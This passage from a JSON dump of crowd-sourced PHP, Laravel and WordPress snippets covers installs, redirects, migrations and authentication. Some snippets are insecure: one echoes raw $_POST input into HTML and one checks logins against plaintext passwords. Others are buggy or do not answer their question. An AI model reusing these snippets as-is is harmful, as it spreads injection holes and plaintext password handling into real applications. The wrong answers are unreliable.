    "description": "// How to install bootstrap in laravel  composer require laravel/ui php artisan ui bootstrap npm install && npm run dev\ncomposer require laravel/ui php artisan ui bootstrap # to install the auth scaffoldings line 3 instead php artisan ui bootstrap --auth npm install npm run dev\ncomposer require laravel/ui php artisan ui bootstrap php artisan ui bootstrap --auth npm install npm run dev npm run production\ncomposer create-project --prefer-dist laravel/laravel ProjectName dev-develop\n$ php artisan ui bootstrap \n$ npm install \n",
    "reg_date": "2021-10-12T10:14:52.000Z"
  },
  {
    "id": 1665,
    "keyword": null,
    "link": null,
    "title": " how to install bootstrap in laravel 8 with auth",
    "description": "// How to install Auth in laravel  // With Boothstrap composer require laravel/ui --dev php artisan ui bootstrap --auth npm install && npm run dev  // With VUE composer require laravel/ui --dev php artisan ui vue --auth npm install && npm run dev\n// How to install bootstrap in laravel  composer require laravel/ui php artisan ui bootstrap npm install && npm run dev\n// How to install bootstrap in laravel with Auth  composer require laravel/ui php artisan ui bootstrap --auth npm install npm run dev\n",
    "reg_date": "2021-10-12T10:14:53.000Z"
  },
  {
    "id": 1666,
    "keyword": null,
    "link": null,
    "title": " how to install laravel",
    "description": "composer create-project --prefer-dist laravel/laravel blog \"6.*\"\nLaravel 8* install composer comand  composer create-project laravel/laravel .  php artisan serve\ncomposer global require \"laravel/installer\"\nYou can create project by 2 ways:  First is installing it without defining version: composer create-project laravel/laravel yourProjectName  Secondly you can install by defining version: composer create-project laravel/laravel=\"VersionOfYourChoice\" yourProjectName\ncomposer global require laravel/installer  laravel new blog\ncomposer global require \"laravel/installer=~1.1\"\n",
    "reg_date": "2021-10-12T10:14:53.000Z"
  },
  {
    "id": 1667,
    "keyword": null,
    "link": null,
    "title": " how to install php-fpm",
    "description": "<?php // Step 1: Setup PHP with Apache2 HTTP Server  sudo apt update sudo apt install apache2  sudo systemctl stop apache2.service sudo systemctl start apache2.service sudo systemctl enable apache2.service  // Step 2: Install PHP 7.4 to Support Apache2  sudo apt-get install software-properties-common sudo add-apt-repository ppa:ondrej/php  sudo apt update  sudo apt-get install php7.4 libapache2-mod-php7.4 php7.4-cli php7.4-mysql php7.4-gd php7.4-imagick php7.4-recode php7.4-tidy php7.4-xmlrpc  // Step 3: Configure PHP 7.4 for Apache2    sudo nano /etc/php/7.4/apache2/php.ini  file_uploads = On allow_url_fopen = On memory_limit = 256M upload_max_filesize = 100M max_execution_time = 360 date.timezone = America/Chicago <IfModule mod_dir.c>      DirectoryIndex index.html index.cgi index.pl index.php index.xhtml index.htm </IfModule> # vim: syntax=apache ts=4 sw=4 sts=4 sr noet  sudo systemctl restart apache2.service ?>\nsudo apt-get update sudo apt-get install php-fpm \n",
    "reg_date": "2021-10-12T10:14:53.000Z"
  },
  {
    "id": 1668,
    "keyword": null,
    "link": null,
    "title": " how to install php curl (linux) apache2",
    "description": "#install the latest php CURL sudo apt-get install php-curl  #install a specific PHP[version]-curl, php version 5 is the example below sudo apt-get install php5-curl  #restart apache by typing sudo service apache2\n",
    "reg_date": "2021-10-12T10:14:53.000Z"
  },
  {
    "id": 1669,
    "keyword": null,
    "link": null,
    "title": " how to install php dependencies",
    "description": "# via composer # https://getcomposer.org composer require 'some-packages'\nphp composer.phar update\n",
    "reg_date": "2021-10-12T10:14:53.000Z"
  },
  {
    "id": 1670,
    "keyword": null,
    "link": null,
    "title": " how to install php fm",
    "description": "sudo apt-get update sudo apt-get install php-fpm \n",
    "reg_date": "2021-10-12T10:14:53.000Z"
  },
  {
    "id": 1671,
    "keyword": null,
    "link": null,
    "title": " how to install php mcrypt module",
    "description": "'if you don\\'t have php installed, run: sudo apt install php-7.2  'if php is already installed, start from here: 'this is the required dependency sudo apt install php-dev libmcrypt-dev php-pear  'installing using pecl channel sudo pecl channel-update pecl.php.net sudo pecl install mcrypt-1.0.1  'After successfull installation you will get the following:   'Build process completed successfully   'Installing \\'/usr/lib/php/20170718/mcrypt.so'   'install ok: channel://pecl.php.net/mcrypt-1.0.1   'configuration option \"php_ini\" is not set to php.ini location   'You should add \"extension=mcrypt.so\" to php.ini    'you can choose any editor of your choice sudo vi /etc/php/7.2/cli/php.ini  'Now copy:   [PHP]   extension=mcrypt.so 'then save the file and exit  'If you are using apache2 server, make the above mentioned change in the following file: sudo vi /etc/php/7.2/apache2/php.ini  'then save, and you\\'re done!\n",
    "reg_date": "2021-10-12T10:14:53.000Z"
  },
  {
    "id": 1672,
    "keyword": null,
    "link": null,
    "title": " how to install theme phpmyadmin",
    "description": "// put to themes of phpmyadmin themes xamppfiles/phpmyadmin/themes echo \"how to install theme phpmyadmin\"; // https://www.phpmyadmin.net/themes/\n",
    "reg_date": "2021-10-12T10:14:53.000Z"
  },
  {
    "id": 1673,
    "keyword": null,
    "link": null,
    "title": " how to iterate through php array",
    "description": "$clothes = array(\"hat\",\"shoe\",\"shirt\"); foreach ($clothes as $item) { \techo $item; }\n$ar = ['Rudi', 'Morie', 'Halo', 'Miki'];  for ($i=0, $len=count($ar); $i<$len; $i++) {     echo \"$ar[$i] \\n\"; } /* Rudi  Morie  Halo  Miki  */\nforeach (array_expression as $value)     statement foreach (array_expression as $key => $value)     statement\n",
    "reg_date": "2021-10-12T10:14:53.000Z"
  },
  {
    "id": 1674,
    "keyword": null,
    "link": null,
    "title": " how to json encode an array in php unexpected identifier",
    "description": "// Don't wrap the json_encode result in quotes var data = <?php echo json_encode($serializedData) ?>; \n",
    "reg_date": "2021-10-12T10:14:53.000Z"
  },
  {
    "id": 1675,
    "keyword": null,
    "link": null,
    "title": " how to kill child",
    "description": "//Thank god you're a programmer and not a serial killer\n<?php //Thank god you're a programmer and not a serial killer\n",
    "reg_date": "2021-10-12T10:14:54.000Z"
  },
  {
    "id": 1676,
    "keyword": null,
    "link": null,
    "title": " how to kill child with fork",
    "description": "<?php //Thank god you're a programmer and not a serial killer\n",
    "reg_date": "2021-10-12T10:14:54.000Z"
  },
  {
    "id": 1677,
    "keyword": null,
    "link": null,
    "title": " how to know the path of php in linux",
    "description": "which php \n",
    "reg_date": "2021-10-12T10:14:54.000Z"
  },
  {
    "id": 1678,
    "keyword": null,
    "link": null,
    "title": " how to link external php file to html",
    "description": "<!DOCTYPE html>  <html>   <head>   \t<title>External PHP File</title>   </head>   <body>   \t<?php include 'example.php';?>   <body> </html>\n/*You need to change that .html file to .php file. In this way,  you can easily link one php file to another.*/   <html> <body>  <h1>Welcome to my home page!</h1> <p>Some text.</p> <p>Some more text.</p> <?php include 'footer.php';?>  </body> </html>\n",
    "reg_date": "2021-10-12T10:14:54.000Z"
  },
  {
    "id": 1679,
    "keyword": null,
    "link": null,
    "title": " how to log object laravel logger",
    "description": "use Illuminate\\Support\\Facades\\Log;  Log::emergency($message); Log::alert($message); Log::critical($message); Log::error($message); Log::warning($message); Log::notice($message); Log::info($message); Log::debug($message);\nuse Illuminate\\Support\\Facades\\Log;  Log::info(json_encode($user);\nLog::info(print_r($user, true));\n",
    "reg_date": "2021-10-12T10:14:54.000Z"
  },
  {
    "id": 1680,
    "keyword": null,
    "link": null,
    "title": " how to loop array in laravel",
    "description": "@foreach($data as $key=>$value) \t{{$value->column_name}} @endforeach\n",
    "reg_date": "2021-10-12T10:14:54.000Z"
  },
  {
    "id": 1681,
    "keyword": null,
    "link": null,
    "title": " how to make-migrations in laravel",
    "description": "php artisan make:migration create_users_table \nphp artisan make:migration create_users_table --create=users  php artisan make:migration add_votes_to_users_table --table=users\n",
    "reg_date": "2021-10-12T10:14:54.000Z"
  },
  {
    "id": 1682,
    "keyword": null,
    "link": null,
    "title": " how to make a column a foreign key in phpmyadmin xampp",
    "description": "DROP TABLE IF EXISTS `Customer`; /*!40101 SET @saved_cs_client     = @@character_set_client */; /*!50503 SET character_set_client = utf8mb4 */; CREATE TABLE `Customer` (   `CustomerID` varchar(45) NOT NULL,   `Username` varchar(45) NOT NULL,   `Password` varchar(45) NOT NULL,   `Gender` varchar(45) NOT NULL,   `DoB` date NOT NULL,   `AddressID` varchar(45) NOT NULL,   `ContactID` varchar(45) NOT NULL,   `Picture` blob NOT NULL,   PRIMARY KEY (`CustomerID`),   KEY `AddressID` (`AddressID`),   KEY `ContactID` (`ContactID`),   CONSTRAINT `AddressID` FOREIGN KEY (`AddressID`) REFERENCES `Addresses` (`AddressID`) ON DELETE CASCADE ON UPDATE CASCADE,   // There Must be a Table Called Addresses which holds a Column AddressID as PRIMARY KEY   CONSTRAINT `ContactID` FOREIGN KEY (`ContactID`) REFERENCES `Contacts` (`ContactID`) ON DELETE CASCADE ON UPDATE CASCADE     // There Must be a Table Called Contacts which holds a Column ContactID as PRIMARY KEY ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;  @Zenonymous\n",
    "reg_date": "2021-10-12T10:14:54.000Z"
  },
  {
    "id": 1683,
    "keyword": null,
    "link": null,
    "title": " how to make a comment in php",
    "description": "// This is a single-line comment  # This is also a single-line comment  /* This is a multiple-lines comment block that spans over multiple lines */\n/**  * This function compiles a message that tells you how great coffee is  *  * @param string  $compliment A nice word to describe coffee   * @param integer $score      A score out of 10  */\n// This is a single-line comment # This is also a single-line comment /* This is a multiple-lines comment block that spans over multiple lines */\n// single line comment /* multi line comment hello */\n//For a single line comment use //: //this is a comment too //for multi-line comments use /* and */: /* <--start of multi-line comment this is a comment  this is a comment too (end of multi-line comment)-->*/\n$(document).ready(function(){ \t// When user clicks on submit comment to add comment under post \t$(document).on('click', '#submit_comment', function(e) { \t\te.preventDefault(); \t\tvar comment_text = $('#comment_text').val(); \t\tvar url = $('#comment_form').attr('action'); \t\t// Stop executing if not value is entered \t\tif (comment_text === \"\" ) return; \t\t$.ajax({ \t\t\turl: url, \t\t\ttype: \"POST\", \t\t\tdata: { \t\t\t\tcomment_text: comment_text, \t\t\t\tcomment_posted: 1 \t\t\t}, \t\t\tsuccess: function(data){ \t\t\t\tvar response = JSON.parse(data); \t\t\t\tif (data === \"error\") { \t\t\t\t\talert('There was an error adding comment. Please try again'); \t\t\t\t} else { \t\t\t\t\t$('#comments-wrapper').prepend(response.comment) \t\t\t\t\t$('#comments_count').text(response.comments_count);  \t\t\t\t\t$('#comment_text').val(''); \t\t\t\t} \t\t\t} \t\t}); \t}); \t// When user clicks on submit reply to add reply under comment \t$(document).on('click', '.reply-btn', function(e){ \t\te.preventDefault(); \t\t// Get the comment id from the reply button's data-id attribute \t\tvar comment_id = $(this).data('id'); \t\t// show/hide the appropriate reply form (from the reply-btn (this), go to the parent element (comment-details) \t\t// and then its siblings which is a form element with id comment_reply_form_ + comment_id) \t\t$(this).parent().siblings('form#comment_reply_form_' + comment_id).toggle(500); \t\t$(document).on('click', '.submit-reply', function(e){ \t\t\te.preventDefault(); \t\t\t// elements \t\t\tvar reply_textarea = $(this).siblings('textarea'); // reply textarea element \t\t\tvar reply_text = $(this).siblings('textarea').val(); \t\t\tvar url = $(this).parent().attr('action'); \t\t\t$.ajax({ \t\t\t\turl: url, \t\t\t\ttype: \"POST\", \t\t\t\tdata: { \t\t\t\t\tcomment_id: comment_id, \t\t\t\t\treply_text: reply_text, \t\t\t\t\treply_posted: 1 \t\t\t\t}, \t\t\t\tsuccess: function(data){ \t\t\t\t\tif (data === \"error\") { \t\t\t\t\t\talert('There was an error adding reply. Please try again'); \t\t\t\t\t} else { \t\t\t\t\t\t$('.replies_wrapper_' + comment_id).append(data); \t\t\t\t\t\treply_textarea.val(''); \t\t\t\t\t} \t\t\t\t} \t\t\t}); \t\t}); \t}); });\n",
    "reg_date": "2021-10-12T10:14:54.000Z"
  },
  {
    "id": 1684,
    "keyword": null,
    "link": null,
    "title": " how to make a model in folder  in laravel",
    "description": "php artisan make:model <directory_name>/<model_name>\n",
    "reg_date": "2021-10-12T10:14:55.000Z"
  },
  {
    "id": 1685,
    "keyword": null,
    "link": null,
    "title": " how to make controller in laravel",
    "description": "php artisan make:controller MyController\nphp artisan make:controller UserController\nphp artisan make:controller ShowProfile\nSimple controller: php artisan make:controller nameOfController      Want to create controller in a folder? use it like this: php artisan make:controller NameOfFolder/nameOfController      Resource Controller:This controller will create all CRUD methods php artisan make:controller nameOfController --resource\n//i want to create dashboard controller php artisan make:controller DashboardController // if i want to create resourse controller then php artisan make:controller Dashboardcontroller -r //and also with php artisan make:controller Dashboardcontroller --resource\n<?php  namespace App\\Http\\Controllers;  use App\\User; use App\\Http\\Controllers\\Controller;  class UserController extends Controller {     /**      * Show the profile for the given user.      *      * @param  int  $id      * @return Response      */     public function show($id)     {         return view('user.profile', ['user' => User::findOrFail($id)]);     } }\n",
    "reg_date": "2021-10-12T10:14:55.000Z"
  },
  {
    "id": 1686,
    "keyword": null,
    "link": null,
    "title": " how to make db seeder in laravel",
    "description": "#All of them php artisan db:seed #One class php artisan db:seed --class=UserSeeder\nphp artisan make:seeder UsersTableSeeder\n/**  * Run the database seeders.  *  * @return void  */ public function run() {     $this->call([         UserSeeder::class,         PostSeeder::class,         CommentSeeder::class,     ]); }\nalias dbseed='php artisan db:seed'\nclass UsersTableSeeder extends Seeder {     public function run()     {         $limit = env('SEEDER_LIMIT', 1);          echo $this->limit;     } }  //In terminal run: SEEDER_LIMIT=10 php artisan db:seed --class=UsersTableSeeder \n",
    "reg_date": "2021-10-12T10:14:55.000Z"
  },
  {
    "id": 1687,
    "keyword": null,
    "link": null,
    "title": " how to mantain text in form after error php",
    "description": "<input type=\"text\" id=\"name\" name=\"name\" value=\"<?php echo isset($_POST[\"name\"]) ? $_POST[\"name\"] : ''; ?>\"> \n",
    "reg_date": "2021-10-12T10:14:55.000Z"
  },
  {
    "id": 1688,
    "keyword": null,
    "link": null,
    "title": " how to mask phone number in php",
    "description": "$data = '+11234567890';  if(  preg_match( '/^\\+\\d(\\d{3})(\\d{3})(\\d{4})$/', $data,  $matches ) ) {     $result = $matches[1] . '-' .$matches[2] . '-' . $matches[3];     return $result; }\n",
    "reg_date": "2021-10-12T10:14:55.000Z"
  },
  {
    "id": 1689,
    "keyword": null,
    "link": null,
    "title": " how to migrate single table in laravel",
    "description": "php artisan migrate --path=/database/migrations/2020_04_10_130703_create_test_table.php\nphp artisan migrate:refresh --path=/database/migrations/fileName.php\n",
    "reg_date": "2021-10-12T10:14:55.000Z"
  },
  {
    "id": 1690,
    "keyword": null,
    "link": null,
    "title": " how to modify a string that’s passed by reference in php",
    "description": "shuffle($myAry); \n",
    "reg_date": "2021-10-12T10:14:55.000Z"
  },
  {
    "id": 1691,
    "keyword": null,
    "link": null,
    "title": " how to named route resource laravel",
    "description": "// Implicit Model Binding Routes can be created with one line using either: Route::resource('photos', PhotoController::class); // OR Route::resources([ \t'photos' => PhotoController::class,     'posts' => PostController::class, ]);  php artisan make:controller PhotoController --resource --model=Photo   // makes a controller with stubouts for methods:   // index   // create   // store   // show   // edit   // update   // destroy \nBy default, all resource controller actions have a route name; however, you can override these names by passing a names array with your desired route names:  use App\\Http\\Controllers\\PhotoController;  Route::resource('photos', PhotoController::class)->names([     'create' => 'photos.build' ]);\nRoute::resource('faq', 'ProductFaqController', [     'names' => [         'index' => 'faq',         'store' => 'faq.new',         // etc...     ] ]);\n",
    "reg_date": "2021-10-12T10:14:56.000Z"
  },
  {
    "id": 1692,
    "keyword": null,
    "link": null,
    "title": " how to on debug on wp",
    "description": "define( 'WP_DEBUG', true );\n",
    "reg_date": "2021-10-12T10:14:56.000Z"
  },
  {
    "id": 1693,
    "keyword": null,
    "link": null,
    "title": " how to open php in browser",
    "description": "php -S localhost:8000\n",
    "reg_date": "2021-10-12T10:14:56.000Z"
  },
  {
    "id": 1694,
    "keyword": null,
    "link": null,
    "title": " how to open server in php",
    "description": "php -S localhost:8000 // Run Php server\n",
    "reg_date": "2021-10-12T10:14:56.000Z"
  },
  {
    "id": 1695,
    "keyword": null,
    "link": null,
    "title": " how to override default name for apiresourc route in laravel",
    "description": "Route::resource('photo', 'PhotoController', ['parameters' => [     'photo' => 'user_photo' ]]); \n",
    "reg_date": "2021-10-12T10:14:56.000Z"
  },
  {
    "id": 1696,
    "keyword": null,
    "link": null,
    "title": " how to pass data cakephp from",
    "description": "// output, if you wanna get output same below array, you need to use name=\"Member[verify_code]\"  // name=\"Member[email]\"  in form  Array(     [Member] => Array   (       [verify_code] => 123466       [email] => huuvi168@gmail.com       [lang] => zho       [password] => 123       [confirm_password] => 123 ) )      // cake php form   <?=$this->Form->create('Member', array('role' => 'form')); ?>   <fieldset>   <?=$this->Form->input('lang', array('type' => 'hidden', 'value' => $lang, 'required'));?>    <div class=\"form-group\">   <input type=\"hidden\" name=\"Member[verify_code]\" value=\"<?= isset($verify_code) && !empty($verify_code) ? $verify_code : ''; ?>\" />   </div>    <div class=\"form-group\">   <input type=\"hidden\" name=\"Member[email]\" value=\"<?= isset($email) && !empty($email) ? $email : ''; ?>\" />   </div>    <div class=\"form-group\">   <?=$this->Form->input('password', array('class' => 'form-control', 'placeholder' => __d('frontend', 'new_password'), 'label' => '', 'required')); ?>   </div>   </fieldset>   <?=$this->Form->end(); ?>\n",
    "reg_date": "2021-10-12T10:14:56.000Z"
  },
  {
    "id": 1697,
    "keyword": null,
    "link": null,
    "title": " how to pass data to controller in laravel",
    "description": "$dept = DB::table('master_department')->get(); $design = DB::table('master_designation')->get(); return view('registration', ['dept' => $dept], compact('design'));  #if we send as array @foreach($dept as $key=>$d) \t{{ $dept[$key]->dept_title }} @endforeach  #if we send as compact object @foreach($design as $deg) \t<option value=\"{{ $deg->id }}\">{{ $deg->deg_title }}</option>\t\t\t\t\t\t\t @endforeach\n",
    "reg_date": "2021-10-12T10:14:56.000Z"
  },
  {
    "id": 1698,
    "keyword": null,
    "link": null,
    "title": " how to pass id through get template part",
    "description": "<?php get_header();  // etc.  // In the main template file $users = new \\WP_User_Query( [ ... ] );  foreach ( $users as $user ) {     set_query_var( 'user_id', absint( $user->ID ) );     get_template_part( 'template-parts/user', 'contact_methods' ); }\n",
    "reg_date": "2021-10-12T10:14:56.000Z"
  },
  {
    "id": 1699,
    "keyword": null,
    "link": null,
    "title": " how to populate dropdown list with array values in php",
    "description": "<select name=\"mydropdown\">         <option selected=\"selected\">Choose one</option>         <?php         // A sample product array         $products = array(\"Mobile\", \"Laptop\", \"Tablet\", \"Camera\");                  // Iterating through the product array         foreach($products as $item){             echo \"<option value='strtolower($item)'>$item</option>\";         }         ?> </select>\n",
    "reg_date": "2021-10-12T10:14:56.000Z"
  },
  {
    "id": 1700,
    "keyword": null,
    "link": null,
    "title": " how to print array in laravel blade",
    "description": "        @php             var_dump($arr);         @endphp \n<?php dd($array); ?> \n@foreach ($watchFolder as $key => $value)     Key: {{ $key }}         Value: {{ $value }}  @endforeach \necho implode(\"\\n\",$array); \necho implode(\"\\n\",array_collapse($array)); \n@foreach ($watchFolder as $w)     {{ $w->name }}     @endforeach \nclass WatchController extends Controller {     public function index(\\Illuminate\\Filesystem\\Filesystem $filesystem)     {         $files = $filesystem->allFiles($watchFolderPath);          // Your code.          return view('name', ['files' => $files]);     } } \n",
    "reg_date": "2021-10-12T10:14:57.000Z"
  },
  {
    "id": 1701,
    "keyword": null,
    "link": null,
    "title": " how to print on python",
    "description": "print(\"whatever you want to print\")\nprint(\"Hello World!\")\nprint(\"hello guys\")\nprint(\"Write in here whatsoever you want to print\")\na = 5 print('The value of a is', a)\n# Name Harry = \"Harry\" # Age my_age = 8 # Math Problem math = 4 problem = 9 print(Harry,my_age,math * problem)\n",
    "reg_date": "2021-10-12T10:14:57.000Z"
  },
  {
    "id": 1702,
    "keyword": null,
    "link": null,
    "title": " how to read data from curl php",
    "description": "$data = json_decode(file_get_contents('php://input'), true); \n",
    "reg_date": "2021-10-12T10:14:57.000Z"
  },
  {
    "id": 1703,
    "keyword": null,
    "link": null,
    "title": " how to read data from serial port in php",
    "description": " For Windows the Example 1 looks same this one:  <?php  exec('mode com1: baud=9600 data=8 stop=1 parity=n xon=on'); // execute 'help mode' in command line of Windows for help  $fd = dio_open('com1:', O_RDWR);  while (1) {    $data = dio_read($fd, 256);    if ($data) {      echo $data;   } }  ?>  \n<?php class Scanner {   protected $port; // port path, e.g. /dev/pts/5   protected $fd; // numeric file descriptor   protected $base; // EventBase   protected $dio; // dio resource   protected $e_open; // Event   protected $e_read; // Event    public function __construct ($port) {     $this->port = $port;     $this->base = new EventBase();   }    public function __destruct() {     $this->base->exit();      if ($this->e_open)       $this->e_open->free();     if ($this->e_read)       $this->e_read->free();     if ($this->dio)       dio_close($this->dio);   }    public function run() {     $stream = fopen($this->port, 'rb');     stream_set_blocking($stream, false);      $this->fd = EventUtil::getSocketFd($stream);     if ($this->fd < 0) {       fprintf(STDERR, \"Failed attach to port, events: %d\\n\", $events);       return;     }      $this->e_open = new Event($this->base, $this->fd, Event::WRITE, [$this, '_onOpen']);     $this->e_open->add();     $this->base->dispatch();      fclose($stream);   }    public function _onOpen($fd, $events) {     $this->e_open->del();      $this->dio = dio_fdopen($this->fd);     // Call other dio functions here, e.g.     dio_tcsetattr($this->dio, [       'baud' => 9600,       'bits' => 8,       'stop'  => 1,       'parity' => 0     ]);      $this->e_read = new Event($this->base, $this->fd, Event::READ | Event::PERSIST,       [$this, '_onRead']);     $this->e_read->add();   }    public function _onRead($fd, $events) {     while ($data = dio_read($this->dio, 1)) {       var_dump($data);     }   } }  // Change the port argument $scanner = new Scanner('/dev/pts/5'); $scanner->run(); \n",
    "reg_date": "2021-10-12T10:14:57.000Z"
  },
  {
    "id": 1704,
    "keyword": null,
    "link": null,
    "title": " how to read sqlite file in php",
    "description": "<?php    class MyDB extends SQLite3 {       function __construct() {          $this->open('test.db');       }    }    $db = new MyDB();    if(!$db) {       echo $db->lastErrorMsg();    } else {       echo \"Opened database successfully\\n\";    } ?>\n<?php    class MyDB extends SQLite3 {       function __construct() {          $this->open('test.db');       }    }    $db = new MyDB();    if(!$db) {       echo $db->lastErrorMsg();    } else {       echo \"Opened database successfully\\n\";    }     $sql =<<<EOF       CREATE TABLE COMPANY       (ID INT PRIMARY KEY     NOT NULL,       NAME           TEXT    NOT NULL,       AGE            INT     NOT NULL,       ADDRESS        CHAR(50),       SALARY         REAL); EOF;     $ret = $db->exec($sql);    if(!$ret){       echo $db->lastErrorMsg();    } else {       echo \"Table created successfully\\n\";    }    $db->close(); ?>\n",
    "reg_date": "2021-10-12T10:14:57.000Z"
  },
  {
    "id": 1705,
    "keyword": null,
    "link": null,
    "title": " how to receive json data in php",
    "description": "//Json Encode  $person = array(      \"name\" => \"KINGASV\",      \"title\" => \"CTO\" );  $personJSON=json_encode($person);//returns JSON string  //Json Decode  $personJSON = '{\"name\":\"KINGASV\",\"title\":\"CTO\"}';  $person = json_decode($personJSON);  echo $person->name; // KINGASV \nheader('Content-type: application/json'); echo json_encode($array);\n<?php  $data = '{ \t\"name\": \"Aragorn\", \t\"race\": \"Human\" }';  $character = json_decode($data); echo $character->name;\n$data = json_decode(file_get_contents('php://input'), true); print_r($data); echo $data; \n<?php $jsonurl = \"https://reqres.in/api/users/2\"; $json = file_get_contents($jsonurl); $jsonDecode = json_decode($json, true); echo $jsonDecode['data']['email']; ?>\n//code igniter $query=\"qry\"; $query = $this->db->query($query); $res=$query->result(); return json_encode($res);\n",
    "reg_date": "2021-10-12T10:14:57.000Z"
  },
  {
    "id": 1706,
    "keyword": null,
    "link": null,
    "title": " how to redirect a particular user role to a page after login laravel",
    "description": "use Illuminate\\Support\\Facades\\Auth;\npublic function redirectTo() {  $role = Auth::user()->role;   switch ($role) {    case 'admin':      return '/admin_dashboard';      break;    case 'seller':      return '/seller_dashboard';      break;     default:      return '/home';     break;  }}\npublic function handle($request, Closure $next, $guard = null) {  if (Auth::guard($guard)->check()) {    $role = Auth::user()->role;     switch ($role) {      case 'admin':         return redirect('/admin_dashboard');         break;      case 'seller':         return redirect('/seller_dashboard');         break;       default:         return redirect('/home');          break;    }  }  return $next($request);}\nprotected $redirectTo = RouteServiceProvider::HOME;\n<?phpnamespace App\\Http\\Middleware;use Closure;use Illuminate\\Auth\\Middleware\\Role as Middleware;use Illuminate\\Support\\Facades\\Auth;class Role {  public function handle($request, Closure $next, String $role) {    if (!Auth::check()) // This isnt necessary, it should be part of your 'auth' middleware      return redirect('/home');    $user = Auth::user();    if($user->role == $role)      return $next($request);    return redirect('/home');  }}\n",
    "reg_date": "2021-10-12T10:14:57.000Z"
  },
  {
    "id": 1707,
    "keyword": null,
    "link": null,
    "title": " how to redirect back to admin page if user is not authenticated in laravel based on the guard",
    "description": "Redirect unauthenticated user according to their guards    Change your Authenticate middleware to this      <?php  namespace App\\Http\\Middleware;  use Closure; use Illuminate\\Auth\\Middleware\\Authenticate as Middleware; use Illuminate\\Support\\Arr;  class Authenticate extends Middleware {     protected $guards;      /**      * Handle an incoming request.      *      * @param  \\Illuminate\\Http\\Request  $request      * @param  \\Closure  $next      * @param  string[]  ...$guards      * @return mixed      *      * @throws \\Illuminate\\Auth\\AuthenticationException      */     public function handle($request, Closure $next, ...$guards)     {         $this->guards = $guards;          return parent::handle($request, $next, ...$guards);     }      /**      * Get the path the user should be redirected to when they are not authenticated.      *      * @param  \\Illuminate\\Http\\Request  $request      * @return string|null      */     protected function redirectTo($request)     {         if (! $request->expectsJson()) {             if (Arr::first($this->guards) === 'admin') {                 return route('admin.login');             }              return route('login');         }     } }\nDo this step from the upgrade guide  https://laravel.com/docs/7.x/upgrade#authentication-scaffolding  ############ composer require laravel/ui \"^2.0\"\nRedirect unauthenticated user according to their guards\n",
    "reg_date": "2021-10-12T10:14:57.000Z"
  },
  {
    "id": 1708,
    "keyword": null,
    "link": null,
    "title": " how to redirect to another page after login in laravel",
    "description": "class RegisterController extends Controller {     protected $redirectTo = '/home';      protected function redirectTo()     {         if (auth()->user()->role_id == 1) {             return '/admin';         }         return '/home';     }  } \nprotected function authenticated(Request $request, $user) { \t if ($user->role_id == 1) { \t \treturn redirect('/admin'); \t } else if ($user->role_id == 2) { \t \treturn redirect('/author'); \t } else { \t \treturn redirect('/blog'); \t } }\nnamespace App\\Http\\Controllers\\Auth;  use App\\Http\\Controllers\\Controller;  use Illuminate\\Foundation\\Auth\\AuthenticatesUsers;  use Illuminate\\Http\\Request;  class LoginController extends Controller { /* |-------------------------------------------------------------------------- | Login Controller |-------------------------------------------------------------------------- | | This controller handles authenticating users for the application and | redirecting them to your home screen. The controller uses a trait | to conveniently provide its functionality to your applications. | */  use AuthenticatesUsers;   protected function authenticated(Request $request, $user) { if ( $user->isAdmin() ) {// do your magic here     return redirect()->route('dashboard'); }   return redirect('/home'); } /**  * Where to redirect users after login.  *  * @var string  */ //protected $redirectTo = '/admin';  /**  * Create a new controller instance.  *  * @return void  */ public function __construct() {     $this->middleware('guest', ['except' => 'logout']); } }\n$this->redirectTo = route('dashboard');\nuse AuthenticatesUsers; protected $redirectTo = '/'; public function __construct() {     $this->middleware('guest')->except('logout'); } public function guard() {     return Auth::guard('customer'); } public function login(Request $request) {     $rememberMe = $request->remember ? true : false;     $customer = Customer::where(['phone' => $request->phone, 'password' => $request->pin])->first();      if (!empty($customer)) {         Auth::guard('customer')->login($customer, $rememberMe);          return redirect()->intended('landing_page');     }      return back()->withInput()->withErrors(['Invalid Credential!']); }\n",
    "reg_date": "2021-10-12T10:14:57.000Z"
  },
  {
    "id": 1709,
    "keyword": null,
    "link": null,
    "title": " how to redirect to another page in php",
    "description": "//PHP redirect  header(\"Location: https://www.codegrepper.com/my-redirect-page.php\");  die();  \n<?php   header(\"Location: (redirect url)\"); ?>\n< ?php header(\"Location: http://www.redirect.to.url.com/\"); ?>\nheader(\"Location: http://example.com\"); die();\n<?php header(\"Location: anotherDirectory/anotherFile.php\"); ?> \n<?php header(\"Location: http://www.redirect.to.url.com/\"); ?> \n",
    "reg_date": "2021-10-12T10:14:57.000Z"
  },
  {
    "id": 1710,
    "keyword": null,
    "link": null,
    "title": " how to redirect to another page in php after submit",
    "description": "Right after @mail($email_to, $email_subject, $email_message, $headers);  header('Location: nextpage.php');  Note that you will never see 'Thanks for subscribing to our mailing list'  That should be on the next page, if you echo any text you will get an error because the headers would have been already created, if you want to redirect never return any text, not even a space! \n",
    "reg_date": "2021-10-12T10:14:58.000Z"
  },
  {
    "id": 1711,
    "keyword": null,
    "link": null,
    "title": " how to redirect to php",
    "description": "//PHP redirect  header(\"Location: https://www.codegrepper.com/my-redirect-page.php\");  die();  \n<?php   header(\"Location: (redirect url)\"); ?>\n< ?php header(\"Location: http://www.redirect.to.url.com/\"); ?>\nfunction location($where){ \techo '<script>window.location.href=\"'.$where.'\"</script>'; }   location(\"https://youtube.com\");\nheader(\"location: THE LOCATION\"); //\"THE LOCATION\", put in a URL or directory to redirect to. For example, header(\"location: https://google.com/\"); or header(\"location: ../../images/dog/\");\n",
    "reg_date": "2021-10-12T10:14:58.000Z"
  },
  {
    "id": 1712,
    "keyword": null,
    "link": null,
    "title": " how to redirect with php",
    "description": "//PHP redirect  header(\"Location: https://www.codegrepper.com/my-redirect-page.php\");  die();  \n< ?php header(\"Location: http://www.redirect.to.url.com/\"); ?> \n<?php   header(\"Location: (redirect url)\"); ?>\n< ?php header(\"Location: http://www.redirect.to.url.com/\"); ?>\nheader(\"Location: http://example.com\"); die();\nheader(\"Location: pagetoredirectfor.php\"); exit();\n",
    "reg_date": "2021-10-12T10:14:58.000Z"
  },
  {
    "id": 1713,
    "keyword": null,
    "link": null,
    "title": " how to remove Website field from comments",
    "description": "add_filter('comment_form_default_fields', 'clear_url_box'); function clear_url_box($fields){     if(isset($fields['url']))     unset($fields['url']);     return $fields; }\n",
    "reg_date": "2021-10-12T10:14:58.000Z"
  },
  {
    "id": 1714,
    "keyword": null,
    "link": null,
    "title": " how to remove annoying plugin notification in wordpress",
